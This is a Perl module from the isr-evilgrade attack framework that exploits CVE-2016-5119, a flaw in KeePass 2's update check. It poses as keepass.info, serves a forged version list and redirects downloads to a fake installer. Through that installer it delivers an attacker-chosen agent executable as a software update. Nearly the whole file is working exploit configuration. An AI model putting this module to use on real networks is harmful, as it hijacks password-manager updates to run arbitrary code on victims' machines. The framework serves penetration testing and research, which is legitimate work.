###############
# keepass.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# Info
# CVE-2016-5119:
# https://bogner.sh/2016/03/mitm-attack-against-keepass-2s-update-check/
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::keepass;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'keepass',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Keepass updater.},
    'vh'          => 'keepass.info',
    'request'     => [
        {   'req'     => 'update/version2x.txt.gz', #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '0',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Accept-Ranges: bytes\r\n"
                . "Content-Length: 482 \r\n"
                . "Connection: close \r\n"
                . "Content-Type: text/plain\r\n\r\n" . ":
KeePass:<%VERSION%>
ArcFour Cipher Plugin:2.0.9
CodeWallet3ImportPlugin:1
DataBaseBackup:2.0.8.6
DataBaseReorder:2.0.8
EnableGridLines:1.1
eWallet Liberated Data Importer:0.12
IOProtocolExt:1.12
ITanMaster:2.28.0.2
KdbxLite:1.1
KeeAutoExec:1.8
KeeOldFormatExport:1
KeeResize:1.7
KPScript - Scripting KeePass:2.34
OnScreenKeyboard2:1.2
OtpKeyProv:2.4
PwGen8U:1
PwGenBaliktad:1.2
QR Code Generator:2.0.12
QualityColumn:1.2
Sample Plugin for Developers:2.0.9
SpmImport:1.2
WinKee:2.28.0.1
:",
        },
        {   'req' => 'sflogo\.php\?group_id=\d+&type=\d+',    #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => 0,
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://keepass.info/<%EXENAME%>.exe \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.exe',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'version' => {
            'val' => '3.12',
            'desc' =>
                'Version, has to be older than target. No more than 3 digits.'
        },
        'exename' => {
            'val'  => 'KeePass-3.12',
            'desc' => 'Zip name'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
